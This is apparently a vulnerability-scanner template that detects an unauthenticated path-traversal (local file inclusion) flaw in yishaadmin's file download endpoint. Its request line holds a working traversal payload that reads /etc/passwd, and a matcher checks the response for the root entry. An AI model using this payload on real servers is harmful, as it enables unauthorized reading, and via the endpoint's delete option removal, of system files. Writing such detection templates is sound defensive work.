id: "yishaadmin-lfi"
name: "yishaadmin - Local File Inclusion"
severity: "high"
description: "yishaadmin is vulnerable to local file inclusion via the \"/admin/File/DownloadFile\" endpoint and allows files to be downloaded, read or deleted without any authentication."
tech:
  - "generic"
tags:
  - "lfi"
  - "yishaadmin"
  - "huntr"
  - "vuln"
cwe: "CWE-22"
reference: "https://huntr.dev/bounties/2acdd87a-12bd-4ce4-994b-0081eb908128/"
spaExclusion: true
request:
  method: "GET"
  path: "/admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
  - type: "status"
    status:
      - 200
